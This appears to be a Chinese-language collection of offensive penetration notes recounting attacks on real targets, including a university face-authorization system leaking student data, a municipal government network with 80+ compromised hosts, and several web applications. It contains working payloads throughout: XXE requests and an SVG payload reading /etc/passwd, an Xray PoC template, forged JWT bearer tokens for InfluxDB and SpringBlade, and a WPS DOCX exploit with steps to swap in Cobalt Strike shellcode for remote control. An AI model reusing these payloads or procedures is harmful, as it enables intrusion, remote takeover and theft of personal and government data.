通过情报泄露的统一账户-登入小程序ECNU人脸授权系统发现存在学号遍历信息，获取全校人脸特征等敏感数据

xxxxx-xxxxxecnu.edu.cn

直接学号登入

账号昵称: 102xxxx02419

密码: qazxxxx

进去以后可以看到当前账户人脸的数据

学号可以遍历

https://xxxxxxxxnu.edu.cn/api/v2/service/user?number=10245402419

全校人脸特征，姓名，性别学号学院信息泄露

https://xxxxxxxxxxxxn/image/102454024/c483f5b76b698ec5082778c9ab66bf6d_face_convert1724411251308.jpg

### - 某市政务漏洞合集[特别重大成果]

主要使用 ***\*titian 漏扫工具\**** 结合自定义 POC，通过 “端口扫描→弱口令爆破→漏洞验证→未授权访问探测” 的流程，实现对目标资产的全方位渗透，核心手段包括 SSH/SMB/Oracle 弱口令爆破、MS17-010 漏洞探测、Redis 未授权利用等。

针对 ***\*公网网段（xxxxx.0.0/16）\**** 与 ***\*内网网段（17xxxxxxxx.0.0/16）\**** 展开，覆盖政务系统、企业服务器、数据库节点等多类资产，目标包含 Windows Server、Linux（CentOS/Ubuntu）等操作系统，涉及 Web 服务、数据库、中间件等核心组件。本次攻击共达成 ***\*4 类核心成果\****，累计控制 / 可利用目标资产 ***\*80 + 台\****，具体数据如下：

| ***\*成果类型\****            | ***\*数量\**** | ***\*核心价值\****               |
| ----------------------------- | -------------- | -------------------------------- |
| 系统权限获取（root / 管理员） | 55 + 台        | 直接控制主机，可执行任意系统命令 |
| 高危漏洞确认（可 RCE）        | 8 台           | 可通过漏洞快速获取系统权限       |
| 未授权服务访问                | 12 台          | 可间接植入后门或泄露敏感数据     |
| 敏感政务 / 企业系统情报       | 15 个          | 明确高价值攻击目标，支撑定向渗透 |

1. Linux 系统 SSH root 权限（50 + 台）

通过 root 账号 + 统一弱口令爆破成功，覆盖公网、内网核心节点，爆破成功率超 60%；共性：主机未修改初始默认弱口令、开放 root 账号 SSH 直登。

部分关键主机明细：

|  目标 IP   | 端口 | 账号 |  密码  |      操作系统      |                      可控能力                      |
| :--------: | :--: | :--: | :----: | :----------------: | :------------------------------------------------: |
| 59.208.*.* |  22  | root | ****** |   Linux CentOS 7   | 执行 crontab 定时任务、写入 SSH 公钥、内网横向扫描 |
| 59.208.*.* |  22  | root | ****** | Linux Ubuntu 18.04 |         读取 /etc/passwd、部署挖矿恶意程序         |
| 172.27.*.* |  22  | root | ****** |   Linux CentOS 8   |         查看系统日志、管控 Nginx Web 服务          |
| 172.27.*.* |  22  | root | ****** |   Linux CentOS 7   |           操作 MySQL、Redis 数据库客户端           |

2. Windows 系统 SMB 管理员权限（1 台）

获取 administrator 管理员权限，可通过 SMB 共享、远程命令执行管控主机：

|  目标 IP   | 端口 |   账号    |  密码  |            操作系统             |                    可控能力                     |
| :--------: | :--: | :-------: | :----: | :-----------------------------: | :---------------------------------------------: |
| 172.27.*.* | 445  | admxxxxor | ****** | Windows Server 2012 R2 Standard | 访问 C 盘共享文件、借助 PsExec 远程执行系统命令 |

3. Oracle 数据库 sys 最高权限（1 台）

爆破拿到数据库超级管理员权限，可操控全库对象并联动系统权限：

|  目标 IP   | 端口 | 数据库类型 | 账号 |  密码  |  数据库版本   |                       可控能力                       |
| :--------: | :--: | :--------: | :--: | :----: | :-----------: | :--------------------------------------------------: |
| 59.208.*.* | 1521 |   Oracle   | sys  | ****** | Oracle 11g R2 | 新建数据库账号、读取敏感密码表、调用执行操作系统命令 |

二、高危漏洞确认成果（高风险）

1. MS17-010（永恒之蓝）远程代码执行漏洞（3 台）

无补丁 Windows Server 2008 R2 系列主机可一键利用，直接获取 SYSTEM 最高系统权限：

|  目标 IP   | 端口 |            操作系统版本             |       漏洞验证方式       |               利用价值               |
| :--------: | :--: | :---------------------------------: | :----------------------: | :----------------------------------: |
| 59.208.*.* | 445  | Windows Server 2008 R2 Standard SP1 | 端口探测 + 漏洞 POC 验证 |    极高，Metasploit 一键 GetShell    |
| 59.208.*.* | 445  | Windows Server 2008 R2 Standard SP1 | 端口探测 + 漏洞 POC 验证 |      极高，直接获取 SYSTEM 权限      |
| 59.208.*.* | 445  | Windows Server 2008 R2 Standard SP1 | 端口探测 + 漏洞 POC 验证 | 极高，关联工程建设审批类政务业务系统 |

2. Web 应用高危漏洞（5 台）

借助扫描工具确认存在远程命令执行、敏感信息泄露类高危漏洞：

|          脱敏目标地址           |            漏洞类型            |        系统名称         |     验证方式      |                 利用价值                  |
| :-----------------------------: | :----------------------------: | :---------------------: | :---------------: | :---------------------------------------: |
|      59.xxx.*.*:8080/login      |       Shiro 反序列化漏洞       |  工程建设审批管理系统   | InfoScan 扫描验证 |    高，获取 Tomcat 权限、接管 Web 服务    |
|      59.2xx.*.*:8082/login      |       Shiro 反序列化漏洞       |     政务云表单系统      | InfoScan 扫描验证 |      高，批量读取表单内敏感业务数据       |
|        59.xx8x.*.*:8099         | Alibaba Nacos 远程命令执行漏洞 |      服务注册中心       | PocScan 扫描验证  |      高，服务端远程执行任意系统命令       |
| 59.xx8.*.*:8087/swagger-ui.html |     Swagger UI 未授权访问      |    企业 API 网关服务    | PocScan 扫描验证  | 中，泄露全部 API 接口文档，为渗透提供路径 |
|         172xx.*.*:9090          |     go-pprof 内存泄露漏洞      | Prometheus 运维监控系统 | PocScan 扫描验证  |       中，抓取进程内存敏感明文信息        |

三、未授权服务访问成果（中高风险）

1. Redis 未授权访问（2 台）

服务无访问密码，可通过文件写入完成提权、持久化控制：

| 目标 IP | 端口 | 服务版本  |            未授权操作能力             |            利用价值            |
| :-----: | :--: | :-------: | :-----------------------------------: | :----------------------------: |
|  172xx  | 6379 | Redis 5.0 | 写入 SSH 公钥、写入定时任务反弹 Shell | 极高，直接获取服务器 root 权限 |
|  172xx  | 6379 | Redis 6.2 |   读取 RDB 持久化缓存、篡改服务配置   | 高，窃取会话、业务缓存敏感数据 |

2. Memcached 未授权访问（2 台）

缓存服务无身份校验，可随意读写缓存数据：

|  目标 IP   | 端口  |   服务版本    |         未授权操作能力         |            利用价值            |
| :--------: | :---: | :-----------: | :----------------------------: | :----------------------------: |
| 59.xxx.*.* | 11211 | Memcached 1.6 |  读取用户 Token、业务明文缓存  | 中，劫持用户会话、伪造身份登录 |
| 172xx.*.*  | 11211 | Memcached 1.4 | 植入恶意缓存，触发应用逻辑漏洞 |   中，辅助 Web 应用定向攻击    |

四、敏感系统情报成果（中风险）

地名模糊化、IP 脱敏，保留系统属性与风险价值：

|       系统名称       |      脱敏访问地址       |       系统类型       |            核心功能            |             情报价值             |
| :------------------: | :---------------------: | :------------------: | :----------------------------: | :------------------------------: |
|  省级大数据能力平台  |    https://59xxx.*.*    | 省级政务数据汇聚平台 | 归集全省政务、企业信用档案数据 |    极高，海量高密政务数据存储    |
| 国资国企在线监管系统 | http://59.xxx.*.*/login |   国资风控监管平台   | 国企资产、投融资、财务台账监管 | 极高，商业机密、股权敏感信息集中 |
| 工程建设审批管理系统 | xx.*.*:8080/tenant/xzsp |   政务行政审批系统   |  工程项目立项、招投标流程审批  |  高，项目建设单位、招标涉密资料  |
| 地市中小企业融资平台 |    https://172xxx*.*    |   普惠金融服务系统   |  企业授信、融资申请、信用评估  |  高，企业对公账户、信贷隐私数据  |
|   政务目录管理系统   | http://59.xxx.*.*:8091  |   政务资源调度系统   | 政务系统架构、数据共享目录管理 |    中，可梳理整体内网资产拓扑    |

### 某市xx局sql注入漏洞

https://xxxxxxom.cn/PS_PolicyList.aspx

SQL注入-os-shell获取服务器权限

http://219xxxxxxxx.221.149:8901/

SQL注入写入webshell，帆软数据决策系统SQL注入漏洞。

### 某文章软件并发点赞

在 bxxxxx中寻找任意一篇文章

此处为：https://www.bxxxxx.cn/post/1634635 

点击点赞，抓取点赞数据包发送到 turbo intruder 模式下进行并发

选择 race.py，在数据包任意位置加上%s 

攻击攻击完成之后，刷新页面

点赞变成了 9 个

### XXE任意文件读取

xxxxx wsdl存在XXE漏洞，攻击者通过漏洞可以读取任意文件，造成敏感信息泄露

poc:

```

GET /uapws/servicexxxxxx.update.IUpdateService?xsd=http://x.x.x.x/test.xml HTTP/1.1
Host:
Pragma: no-cache
Cache-Control: no-cache
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

- Xray批量yaml文件

```

name: wfsec-yongyou-NC-uapws-wsdl-XXE
transport: http
set:
  reverse: newReverse()
  reverseUrl: reverse.url
rules:
  r0:
    request:
      method: GET
      path: /uapws/service/nc.uap.oba.update.IUpdateService?xsd={{reverseUrl}}test.xml
    expression: reverse.wait(5)
expression: r0()
detail:
  author: wfsec
  links:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20uapws%20wsdl%20XXE%E6%BC%8F%E6%B4%9E.md
```

### 某小程序电子签名SVG解析

app有个电子签名，添加签名处，点击提交 点击添加签名，抓包将数据包base64解码发现是svg格式的，添加xmlpayload，http协议，探测到出网

xmlpayload在他原有的svg格式上按照他的格式往上加，要不然不会解析。

在text标签中设置一下长宽，要不xxe读的内容不会回显，payload如下,提交的时候要编码：

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"version="1.2"baseProfile="tiny"height="92"width="171"viewBox="0 0 1794 732"><gstroke-linejoin="round"stroke-linecap="round"fill="none"stroke="black"><pathstroke-width="21"d="M255,356c0,0 0,0 0,0 1,0 1,0 2,-1 "/><pathstroke-width="19"d="M257,355c10,-2 10,-2 20,-4 "/><pathstroke-width="18"d="M277,351c19,-5 19,-5 39,-8 31,-6 31,-6 63,-10 34,-4 34,-4 68,-6 34,-1 34,-1 68,0 29,1 29,1 59,3 23,2 23,3 47,6 9,2 9,2 19,4 "/><pathstroke-width="18"d="M1052,231c0,0 0,0 0,0 10,-5 10,-6 21,-10 28,-10 28,-12 57,-19 41,-9 41,-9 82,-14 42,-5 42,-4 84,-6 32,-1 32,1 65,2 6,0 6,0 12,0 "/><pathstroke-width="18"d="M891,542c0,0 0,0 0,0 "/><pathstroke-width="20"d="M891,542c0,0 0,0 0,0 2,-1 2,-1 4,-1 "/><pathstroke-width="18"d="M895,541c24,-5 24,-7 48,-11 59,-7 59,-7 118,-10 80,-5 80,-4 160,-5 78,-1 78,0 156,0 34,0 34,0 68,-1 "/></g><textfont-size="96"x="10"y="26">&xxe;</text></svg>
```

将其编码后发送
回到电子签名界面，成功读到/etc/passwd内容

### DOCX写shell

```
wps影响范围为：WPS Office 2023 个⼈版 < 11.1.0.15120

WPS Office 2019 企业版 < 11.8.2.12085



目标主机先在1.html当前路径下启动http server并监听80端口，然后再到目标主机上修改hosts文件：127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn

此时目标主机再打开poc.docx时就会弹出计算机

{可以把1.html中代码的shellcode换成cs生成的shellcode，这样之后打开poc.docx就会被cs远控}

实战：申请{xxxxx}wps.cn域名，

在目标主机host文件增加clientweb.docer.wps.cn.{xxxxx}wps.cn      ip

再到ip中架设1.html网站服务，同时提前修改好1.html中的shellcode成cs的shellcode

具体参考小迪2024第80天
```

### InfluxDB JWT未授权漏洞

```
InfluxDB < 1.7.6
```

```
漏洞原理是1.7.6之前的InfluxDB在services/httpd/handler.go中的身份验证函数中存在身份验证绕过漏洞，因为JWT令牌可能具有空的共享密钥（也被称为共享密钥）

访问htp://IP:8086/query 查询功能有提示需要登录

抓包发现响应头带有X-Influxdb-Version标志头

访问htp://IP:8086/debug/vars 查看系统的服务信息

通过https://jwt.io/#debugger-io** **构造绕过身份验证所需的Token

username代表已存在的用户，exp是时间戳，代表该Token的过期时间，所以需要生成一个未来的时间戳（www.beijing-time.org/shijianchuo/），将secret值置空，得到编码后的Token

抓取/query页面的数据包，将请求方式修改为POST，添加以下请求字段
```

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MDcyNjE1MzE0fQ.mwI2P1j8CIvhxBKFvcyU7TNLBeuFtiUM1mPrKanF1w4

Content-Type: application/x-www-form-urlencoded
```

```
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MDcyNjE1MzE0fQ.mwI2P1j8CIvhxBKFvcyU7TNLBeuFtiUM1mPrKanF1w4
添加该令牌，密钥要去空，username是固定
提价数据需要以post方式提交，将抓取的数据包改为post，sql语句例如：db=sample&q=show users，得到用户回显
需要加上 Content-Type:application/x-www-form-urlencoded 否则数据回显错误
```

### Nday漏洞利用

通过afrog工具识别到了项目中有一个资产使用了Spring Blade框架，并快速使用Nday完成漏洞利用

构造jwt

使用构造的jwt加密

```
Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
```

### 微信公众号未授权+sql

xx渗透，微信公众号，抓包将域名提取出来

1、接口未授权访问 

使用ffuf扫描目录发现了日志系统，该系统未授权而且可以查看所有用户进行的操作记录，总共15w条数据泄露

2、sql注入漏洞 

3、Swagger接口未授权

用yakit对Swagger泄露的接口进行未授权批量测试

查询到一堆xx用户的个人信息，身份证，电话号码等